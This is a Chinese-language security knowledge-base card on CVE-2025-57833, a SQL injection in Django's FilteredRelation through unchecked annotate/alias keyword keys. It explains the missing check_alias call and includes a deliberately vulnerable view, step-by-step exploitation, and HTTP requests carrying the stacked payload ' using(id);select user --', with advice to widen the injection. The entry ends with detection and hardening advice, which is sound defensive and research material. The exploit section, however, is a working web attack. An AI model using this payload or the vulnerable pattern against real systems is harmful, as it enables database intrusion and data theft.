---
id: web-generic-sqli-django-filteredrelation-alias
title: Django FilteredRelation 列别名未校验：annotate/alias 的 **kwargs 键注入 SQL
type: scenario
domain: web
path: web/generic/sqli
technique: django-filteredrelation-alias-sqli
tags:
- python
- django
- orm
- sqli
- filteredrelation
- annotate
- alias
- cve-2025-57833
cve:
- CVE-2025-57833
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: < 5.2.6、< 5.1.12、< 4.2.24（原图安全公告的修复版本；原文复现环境为 Django 5.2）
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:23:17+08:00'
  notes: 已对照原文与 7 张图核对：图01 官方公告确认 CVE-2025-57833、severity high、修复版本 5.2.6/5.1.12/4.2.24（卡片 affected_versions 与之一致）；图02 补丁为 add_filtered_relation 开头新增 check_alias；图03 _annotate 对 FilteredRelation 调用 add_filtered_relation；图04/05 复现环境与正常别名生成含 XXX 的 JOIN；图06 直接 XXX;select user -- 报语法错误；图07 未引用别名时 JOIN 被优化移除。FORBIDDEN_ALIAS_PATTERN 与 using(id) 堆叠注入说明与原文一致。原文未给出成功注入的响应截图，仅文字称读到 postgres；未在本机执行 PoC。
url: /docs/web/generic/sqli/web-generic-sqli-django-filteredrelation-alias/
draft: false
kb_aliases:
- CVE-2025-57833
- Django FilteredRelation SQL 注入
- annotate kwargs 别名注入
- Django ORM 别名注入
- check_alias 绕过
---

## 一句话结论

Django 的 `FilteredRelation` 在 `QuerySet.annotate(**kwargs)`/`alias()` 中以字典键作为 SQL 列别名，而 `add_filtered_relation()` 在修复前未调用 `check_alias()`；当业务把用户输入拼进这个键时，别名会原样进入 `INNER JOIN ... <alias> ON ...`，用 ` using(id);select user --` 即可完成堆叠注入。

## 原理

- `QuerySet._annotate()` 遍历 `annotations.items()`，遇到 `FilteredRelation` 时调用 `clone.query.add_filtered_relation(annotation, alias)`；`add_filtered_relation()` 直接把 `alias` 赋给 `filtered_relation.alias`，随后在编译 JOIN 时作为表别名拼进 SQL。
- SQL 的表别名/列别名是标识符，无法用参数占位符预编译；框架必须自己校验。修复前的 `add_filtered_relation()` 漏掉了这一步，而普通 annotation 路径已有 `check_alias()`。
- `check_alias()` 使用 `FORBIDDEN_ALIAS_PATTERN = r"['`\"\]\[;\s]|--|/\*|\*/"` 拒绝空白、引号、分号、SQL 注释；补丁正是把这一调用补到 `add_filtered_relation()` 开头。
- 触发必须同时满足：使用 `FilteredRelation`（否则不走 `add_filtered_relation`）；别名在后续 `filter()`/`order_by()` 等被引用，否则 ORM 会因“未使用”把整个 JOIN 优化掉，注入字符串根本不出现在 SQL。
- 直接 `alias = "XXX;select user --"` 会让第一条语句在 `JOIN "vuln_author" XXX;select user -- ON ...` 处语法不完整，第二条不会执行。用 PostgreSQL 的 `USING(id)` 让第一条 JOIN 语法合法：`" using(id);select user --"` 生成 `INNER JOIN "vuln_author" using(id);select user -- ON (...)`，前半句成立，后半句堆叠执行。
- 最终危害是数据库层面的 SQL 注入：原文读到数据库执行用户 `postgres`，进一步可读取业务数据。

## 触发条件

- Django 版本在受影响区间（修复版本之前），且应用使用 `FilteredRelation`；
- 应用把外部可控的字典键传给 `annotate()` 或 `alias()` 的 `**kwargs`（例如 `alias_name = body.get('alias')` 后 `**{alias_name: FilteredRelation(...)}`）；
- 该别名在后续查询中被引用（`filter(alias__...)`、`order_by` 等），避免被 ORM 优化移除；
- 数据库支持堆叠查询（原文为 PostgreSQL）；其他数据库需构造使第一条语句合法的注入形态。

## 利用步骤

1. 找接受 `alias` 参数并拼进 `annotate(**{alias: FilteredRelation(...)})` 的接口。
2. 用正常别名（如 `XXX`）请求，观察响应/SQL 中出现 `INNER JOIN "vuln_author" XXX ON ...`，确认别名可控且未被过滤。
3. 直接提交 `XXX;select user --`，观察报错：第一条语句不完整，堆叠语句未执行。
4. 改用 `" using(id);select user --"`，让 JOIN 先以 `USING(id)` 合法闭合，再执行 `select user --`。
5. 读取数据库用户/版本/业务表，按需扩大注入。

## PoC

漏洞视图核心：

```python
query = Book.objects.annotate(
    **{alias_name: FilteredRelation("author", condition=Q(author__name=author_filter))}
).filter(**{f"{alias_name}__id__gt": 0})
```

正常请求：

```http
POST /book/search HTTP/1.1
Content-Type: application/json

{"alias":"XXX","author":"Bob"}
```

生成 SQL：

```sql
SELECT ... FROM "vuln_book" INNER JOIN "vuln_author" XXX
ON ("vuln_book"."author_id" = XXX."id" AND (XXX."name" = Bob))
WHERE XXX."id" > 0
```

注入请求：

```http
POST /book/search HTTP/1.1
Content-Type: application/json

{"alias":" using(id);select user --","author":"Bob"}
```

生成 SQL：

```sql
SELECT ... FROM "vuln_book" INNER JOIN "vuln_author"  using(id);select user -- ON (...)
WHERE  using(id);select user --."id" > 0
```

成功标志：响应中返回数据库用户（原文为 `postgres`）或注入查询结果。

## 变体与关联

- 变体：使用 `QuerySet.alias()` 同样会走到 `_annotate()` 与 `add_filtered_relation()`，注入点一致。
- 变体：不同数据库需要不同的“第一条语句合法化”技巧；MySQL 可能不支持堆叠，可尝试布尔/报错/时间盲注改写 JOIN 条件。
- 变体：别名还可能出现在 `ORDER BY`、`GROUP BY`、子查询别名等标识符位置，原理相同。
- 关联：[[web-generic-sqli-hibernate-hql-native-query-injection]]、[[web-generic-sqli-java-identifier-table-order-by-injection]]（同为 ORM/标识符位置注入）。
- 边界：别名完全由服务端生成、或已应用 `check_alias()` 的修复版本、或目标数据库禁止堆叠查询时，本手法受限。

## 检测与防御

- 检测：请求参数中出现 `;`、`--`、`/*`、空白与 SQL 关键字组合，且被用作 `alias`/`annotate` 的键；SQL 日志中 JOIN 别名含分号/注释。
- 检测：`FilteredRelation` 的别名来自请求体而非固定常量；异常 SQL 语法错误后紧跟可疑查询。
- 防御：升级 Django 到 5.2.6、5.1.12、4.2.24 或更高；不要用用户输入构造 `**kwargs`。
- 加固：别名使用严格白名单 `^[A-Za-z_][A-Za-z0-9_]*$`；数据库账号最小权限；禁用堆叠查询（如可行）；对 ORM 生成的 SQL 做审计。
